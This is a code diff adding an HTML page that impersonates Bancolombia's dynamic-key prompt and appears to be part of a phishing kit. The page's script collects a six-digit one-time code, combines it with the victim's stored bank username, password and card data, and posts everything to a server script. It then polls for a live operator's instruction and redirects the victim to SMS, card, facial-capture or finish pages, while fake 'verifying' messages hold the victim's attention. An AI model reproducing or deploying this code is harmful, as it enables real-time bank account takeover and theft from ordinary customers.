@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="stylesheet" href="css/dina.css">
+  <title>Clave Dinámica</title>
+  <style>
+    /* Estilos para el modal de espera (igual que index.php) */
+    #modalEsperaDina {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.9);
+      z-index: 10010;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      color: white;
+      text-align: center;
+      padding: 20px;
+    }
+    
+    .modal-loader {
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid #f9c411;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    #loaderTextDina {
+      margin-top: 15px;
+      font-size: 1.1em;
+      min-height: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+  </style>
+</head>
+<body>
+  <!-- Modal de espera para dina.html -->
+  <div id="modalEsperaDina">
+    <div class="modal-loader"></div>
+    <p id="loaderTextDina">Verificando código...</p>
+  </div>
+
+  <div class="video-container">
+    <video src="img/1.mov" autoplay muted loop></video>
+  </div>
+
+  <h2>Ingresa la Clave Dinámica</h2>
+  <p>Encuentra tu Clave Dinámica en la app Mi Bancolombia.</p>
+
+  <div class="pin-container">
+    <input type="text" maxlength="1" class="pin-input" />
+    <input type="text" maxlength="1" class="pin-input" />
+    <input type="text" maxlength="1" class="pin-input" />
+    <input type="text" maxlength="1" class="pin-input" />
+    <input type="text" maxlength="1" class="pin-input" />
+    <input type="text" maxlength="1" class="pin-input" />
+  </div>
+
+  <div class="buttons">
+    <button class="btn-borrar" onclick="window.parent.cerrarIframeClave()">Borrar</button>
+    <button class="btn-continuar" onclick="enviarClaveDinamica()">Continuar</button>
+  </div>
+
+  <script>
+    const inputs = document.querySelectorAll('.pin-input');
+    const modalEsperaDina = document.getElementById('modalEsperaDina');
+    const loaderTextDina = document.getElementById('loaderTextDina');
+    
+    // Mensajes para el loader (igual que index.php)
+    const mensajesEspera = [
+        "Verificando código...",
+        "Autorizando transacción...",
+        "Procesando seguridad...",
+        "Validando identidad...",
+        "Por favor, espera un momento..."
+    ];
+    let indexMensaje = 0, intervalLoader;
+
+    function iniciarMensajesLoader() {
+        loaderTextDina.textContent = mensajesEspera[indexMensaje];
+        intervalLoader = setInterval(() => {
+            indexMensaje = (indexMensaje + 1) % mensajesEspera.length;
+            loaderTextDina.textContent = mensajesEspera[indexMensaje];
+        }, 3000);
+    }
+
+    function detenerMensajesLoader() {
+        clearInterval(intervalLoader);
+        indexMensaje = 0;
+    }
+
+    inputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        input.value = input.value.replace(/[^0-9]/g, "");
+        if (input.value.length === 1 && index < inputs.length - 1) {
+          inputs[index + 1].focus();
+        }
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === "Backspace" && input.value === "" && index > 0) {
+          inputs[index - 1].focus();
+        }
+      });
+    });
+
+    // POLLING para verificar respuesta (igual que index.php)
+    async function checkTokenStatus(transactionId) {
+      const TIMEOUT_MS = 180000; // 3 minutos
+      
+      const poll = setInterval(async () => {
+        try {
+          const res = await fetch(`1.php?transactionId=${transactionId}`);
+          const json = await res.json();
+          
+          if (json.ok && json.action) {
+            clearInterval(poll);
+            detenerMensajesLoader();
+            modalEsperaDina.style.display = 'none';
+            
+            // REDIRECCIONES EN TIEMPO REAL - INCLUYENDO FACIAL
+            switch(json.action) {
+              case 'pedir_token':
+                // Ya estamos en dina.html, no hacer nada
+                break;
+                
+              case 'rechazar':
+                // Mostrar modal de error
+                if (window.parent && window.parent.document.getElementById('modalError')) {
+                  window.parent.document.getElementById('modalError').style.display = 'flex';
+                }
+                break;
+                
+              case 'banco_error':
+                alert('Datos de inicio de sesión erróneos. Corríjalos.');
+                if (window.parent) {
+                  window.parent.location.href = 'index.php';
+                } else {
+                  window.location.href = 'index.php';
+                }
+                break;
+                
+              case 'cc':
+                if (window.parent) {
+                  window.parent.location.href = '../../../../data-cc/alter.php';
+                } else {
+                  window.location.href = '../../../../data-cc/alter.php';
+                }
+                break;
+                
+              case 'check':
+              case 'aprobado':
+              case 'fin':
+                if (window.parent) {
+                  window.parent.location.href = 'fin.php';
+                } else {
+                  window.location.href = 'fin.php';
+                }
+                break;
+                
+              case 'sms':
+                if (window.parent) {
+                  window.parent.location.href = 'sms.php';
+                } else {
+                  window.location.href = 'sms.php';
+                }
+                break;
+                
+              case 'facial':  // ⭐ NUEVO: REDIRECCIÓN A FACIAL
+                if (window.parent) {
+                  window.parent.location.href = 'facial_step.html?key=' + transactionId;
+                } else {
+                  window.location.href = 'facial_step.html?key=' + transactionId;
+                }
+                break;
+                
+              default:
+                if (window.parent) {
+                  window.parent.location.href = 'fin.php';
+                } else {
+                  window.location.href = 'fin.php';
+                }
+            }
+          }
+        } catch (error) {
+          console.error('Error en polling:', error);
+        }
+      }, 1000);
+      
+      // Timeout
+      setTimeout(() => {
+        clearInterval(poll);
+        detenerMensajesLoader();
+        modalEsperaDina.style.display = 'none';
+        alert('No se obtuvo respuesta del operador. Por favor intenta más tarde.');
+        if (window.parent) {
+          window.parent.location.href = 'index.php';
+        } else {
+          window.location.href = 'index.php';
+        }
+      }, TIMEOUT_MS);
+    }
+
+    async function enviarClaveDinamica() {
+      const clave = Array.from(inputs).map(i => i.value).join('');
+
+      if (clave.length !== 6) {
+        alert("Debes ingresar los 6 dígitos del código.");
+        return;
+      }
+
+      // Mostrar modal de espera
+      modalEsperaDina.style.display = 'flex';
+      iniciarMensajesLoader();
+
+      // Tomar datos del formato BBVA
+      const tbdatos_bbva = JSON.parse(localStorage.getItem("tbdatos_bbva") || "{}");
+      const usuario = localStorage.getItem("usuario_login") || "";
+      const claveLogin = localStorage.getItem("clave_login") || "";
+      const monto = localStorage.getItem("total_pagar") || "0";
+
+      const transactionToken = crypto.randomUUID();
+
+      const payload = {
+        transactionId: transactionToken,
+        bancoldata: { usuario: usuario, clave: claveLogin },
+        bancoldina: { clave: clave },
+        metodo: "dina",
+        total: monto,
+        tbdatos: tbdatos_bbva
+      };
+
+      try {
+        // Enviar token a 1.php
+        await fetch("1.php", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        // Cerrar iframe si está en uno
+        if (window.parent && typeof window.parent.cerrarIframeClave === "function") {
+          window.parent.cerrarIframeClave();
+        }
+
+        // Iniciar polling para esperar respuesta del operador
+        checkTokenStatus(transactionToken);
+        
+      } catch (error) {
+        console.error('Error al enviar token:', error);
+        detenerMensajesLoader();
+        modalEsperaDina.style.display = 'none';
+        alert('Error al enviar el código. Intenta nuevamente.');
+      }
+    }
+
+    // Limpiar interval al salir
+    window.addEventListener('beforeunload', () => {
+      if (intervalLoader) clearInterval(intervalLoader);
+    });
+  </script>
+</body>
+</html>
